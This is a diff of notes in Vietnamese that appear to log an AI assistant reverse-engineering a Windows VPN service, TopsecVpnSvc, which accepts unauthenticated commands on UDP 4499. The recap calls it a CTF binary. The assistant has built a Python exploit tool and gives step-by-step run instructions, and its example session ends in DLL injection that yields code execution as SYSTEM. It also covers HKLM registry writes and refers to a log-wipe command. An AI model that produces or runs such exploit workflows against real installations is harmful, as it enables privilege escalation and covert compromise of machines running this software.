@@ -749,3 +749,120 @@ Thread sẽ: check NA_CLIENT.EXE → nếu VPN bị lỗi: kill na_client + `ins
 | Info leak | 0x16 | 0x4639FD | Mainboard serial hash |
 | Process launch (XP/32) | 0x01-0x03 | 0x4647AC+ | CreateProcessAsUserW với SYSTEM/Explorer token |
 | Log wipe | 0x1D | 0x464405 | Xóa nội dung TopsecVpnSvc/Client.log |
+
+
+Yêu cầu:
+- Python 3.9+ trên Windows (trong VM có TopsecVpnSvc)
+- Service đang chạy
+
+---
+Bước 1 — Khởi động service (trong VM)
+
+sc start TopsecVpnSvc
+
+Xong. Tổng kết lần check này:
+
+4 fix đã apply:
+
+1. cmd_heartbeat / cmd_close_svclient — thêm if len(resp) < 1: return trước khi access rUDP trả empty datagram
+2. cmd_reg_filepath / cmd_copy_config — bọc encode('mbcs') trong try/except LookupError với fallback latin-1, giống pattern đã có ở cmd_launch_process
+3. Comment cmd 0x01 / 0x03 — sửa lại đúng: chỉ dùng buf[4] path khi đang trong winlogon session (sub_465DE0()==1); nếu là explorer session thì bỏ qua buf[4], hardcode launch install_dir\na_client.exe
+4. Comment DLL contract — sửa *(ptr-4) = data length → *ret_ptr - 4 = actual byte count (service deref return value trước khi trừ 4, không phải offset -4 từ pointer)
+
+Code hiện tại đã đủ và logic đúng với binary.
+
+✻ Churned for 2m 43s
+
+※ recap: Reversing CTF binary sv_service.exe (TopsecVpnSvc, UDP 4499, unauthenticated). Đã hoàn thành docs đầy đủ và Python exploit tool với 20 commands. Sẵn sàng test trên VM.
+
+❯ chạy sao? example cách chạy đi
+
+Yêu cầu:
+- Python 3.9+ trên Windows (trong VM có TopsecVpnSvc)
+- Service đang chạy
+
+---
+Bước 1 — Khởi động service (trong VM)
+
+sc start TopsecVpnSvc
+
+Hoặc kiểm tra:
+sc query TopsecVpnSvc
+
+---
+Bước 2 — Chạy script
+
+python E:\temp\sv_exploit.py
+
+Hoặc copy script vào VM trước:
+python C:\Users\kuvee\Desktop\sv_exploit.py
+
+---
+Example session — các bước thực tế:
+
+Target: 127.0.0.1:4499
+[*] Kiểm tra service...
+[+] TopsecVpnSvc đang CHẠY
+
+========================================================
+  sv_service.exe Exploit Tool — TopsecVpnSvc (SYSTEM)
+========================================================
+ INFO / RECON
+ [1]  0x07  Heartbeat / Ping
+
+[*] CMD 0x07 — Heartbeat
+  [+] Nhận 284 bytes
+  [+] byte[0] = 0x08 (expect 0x08)
+  [+] Service đang CHẠY
+
+  [Enter để tiếp tục...]
+Chọn: 2
+
+[*] CMD 0x09 — Get Install Directory
+  [+] Nhận 260 bytes
+  [+] Install dir: 'C:\\Program Files (x86)\\NGVONE\\Client\\'
+
+  [Enter để tiếp tục...]
+Chọn: 17
+
+[*] CMD 0x04 — DLL Injection (RCE as SYSTEM)
+  [!] Service tự build path: install_dir\secChecker.dll
+  [!] KHÔNG nhận path DLL từ packet — phải đặt DLL đúng chỗ trước
+
+  Argument cho init() [Enter = rỗng]:
+  [*] Gửi packet...
+  [+] Raw response (88 bytes raw): b'AAAAAE5PX0ZMQUdf...'
+  [+] Base64 decoded (64 bytes):
+  [+] Content: 'NO_FLAG_FOUND | user=SYSTEM | pid=1234'
+
+---
+Workflow thực tế cho CTF — thứ tự nên chạy:
+
+[1] Ping trước — xác nhận service alive
+[2] Get install dir — biết đường dẫn để đặt DLL
+[3] Serial hash — fingerprint máy
+[9] Write registry FilePath — test HKLM write (cần tạo key trước)
+[17] DLL inject — RCE as SYSTEM (cần copy secChecker.dll vào install dir)
+
+Setup cho DLL inject (chạy trong VM, cmd as admin):
+
+:: 1. Copy DLL vào install dir
+copy E:\temp\secChecker.dll "C:\Program Files (x86)\NGVONE\Client\secChecker.dll"
+
+:: 2. Chạy exploit
+python sv_exploit.py
+:: Chọn [17]
+
+Setup cho registry write (cmd 0x19):
+
+:: Tạo key trong WOW64 hive (bắt buộc vì service là 32-bit)
+reg add "HKLM\SOFTWARE\WOW6432Node\Topsec" /f
+
+:: Chạy exploit
+python sv_exploit.py
+:: Chọn [9] → nhập giá trị
+
+Copy script nhanh sang VM (nếu dùng shared folder hoặc network):
+
+:: Trong VM PowerShell
+python "\\vmware-host\Shared Folders\temp\sv_exploit.py"
